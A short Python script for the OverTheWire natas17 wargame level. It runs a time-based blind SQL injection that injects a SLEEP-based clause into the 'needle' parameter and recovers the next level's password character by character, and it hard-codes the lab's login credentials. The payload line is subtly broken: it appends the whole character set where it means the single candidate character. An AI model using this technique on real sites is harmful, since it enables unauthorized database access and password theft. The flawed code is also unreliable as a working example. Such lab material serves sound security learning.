#Blind SQL Injection (real time)

import requests
import string


url = "http://natas17.natas.labs.overthewire.org/"


chars = string.ascii_letters + string.digits
password = ""

for x in range(32):
    for y in chars:
        payload = f"natas18\" AND IF(password LIKE BINARY '{password + chars}%', SLEEP(5), 1) #"
        url_params = {
        "needle": payload
        }     
        httpresponse = requests.get(url, params=url_params,auth=("natas17","EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")) 
             
        if httpresponse.elapsed.total_seconds() >= 5:  #blind real time sql timeline server request
            password += y
            print(password)
            break




